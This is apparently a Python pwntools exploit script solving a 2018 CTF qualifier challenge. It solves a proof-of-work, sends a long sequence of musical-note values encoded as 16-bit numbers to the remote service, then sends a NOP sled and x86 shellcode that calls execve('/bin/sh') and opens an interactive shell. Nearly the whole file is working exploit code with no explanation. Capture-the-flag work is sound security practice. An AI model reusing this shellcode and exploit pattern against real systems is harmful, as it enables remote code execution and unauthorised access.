from __future__ import print_function
import sys
import struct
import hashlib
from pwn import *
# inspired by C3CTF's POW

table = ['A' , 'A#' , 'B' , 'C' , 'C#' , 'D' , 'D#' , 'E' , 'F' , 'F#' , 'G' , 'G#']

def val(x):
        a = table.index(x[:-1])*1.0
        b = float(x[-1])
        return (2.0**(b+a/12.0))*27.5
cmd = ["F9","G0"]*0xe
cmd += ["G9","G0"]*0x40
cmd += ["A2","G0","A0","G0"]
cmd += ["G0","G0"]*0xb
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"]
cmd += ["G0","G0"]
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"]
cmd += ["G0","G0"]*0x17
cmd += ["G9","G0"]*0x6
cmd += ["A2","F8"] 
cmd += ["A0","G0"]
cmd += ["A4","A9","E0","A4","D9","E0"]
cmd += ["A0","G1"] 
cmd += ["A0","G2"] 
cmd += ["A4","A9","E0","A4","D9","E0","A2","F8"]
cmd += ["A4","A9","E0","A4","B9","E0"] 
cmd += ["A0","G3"] 
cmd += ["A4","A9","E0","A4","B9","E0"] 
cmd += ["A0","G4"] 
cmd += ["A0","G5"] 
cmd += ["A0","G6"] 
cmd += ["G9","G0"]*6
cmd += ["G0","G0"]*8 
cmd += ["G9","G0"]
cmd += ["A2","F8"]
cmd += ["A0","G0"]
cmd += ["A0","G1"] 
cmd += ["A4","A9","E0","A4","D9","E0"] 
cmd += ["A0","G2"] 
cmd += ["A0","G3"]
cmd += ["A4","A9","E0","A4","D9","E0","A2","F9","A2","F2","A4","A9","E0","A4","F9","E0"]
cmd += ["A0","G4"]
cmd += ["A2","F9","A2","F2","A4","A9","E0","A4","F9","E0","A2","F8"] 
cmd += ["G9","G0"]*4
cmd += ["G0","G0"]*0xb
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"]
cmd += ["G0","G0"] 
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"] 
cmd += ["G0","G0"]*0xc
cmd += ["F9","G0"]*0x7 
cmd += ["A2","F8","A4","A9","E0","A4","B9","E0","G2","G0"]
cmd += ["D9","G0"]*(0x70-0x1f)+["D#7"]*0x1f

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

if __name__ == '__main__':
    r = remote("4e6b5b46.quals2018.oooverflow.io",31337)
    r.recvuntil("Challenge: ")
    challenge = r.recvline()[:-1]
    r.recvuntil("n: ")
    n = int(r.recvline()[:-1])
    print('Solving challenge: "{}", n: {}'.format(challenge, n))

    solution = solve_pow(challenge, n)
    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
    r.sendlineafter("Solution:",str(solution))

    for c in cmd:
        r.send(p16(val(c)))

    r.send(p16(0x0))


    payload = "\x90"*0x18
    payload += asm("""
    mov esp,0x40404a00
    push 0x0068732f
    push 0x6e69622f
    mov eax,0xb
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    int 0x80
    """)
    r.send(payload)
    r.interactive()


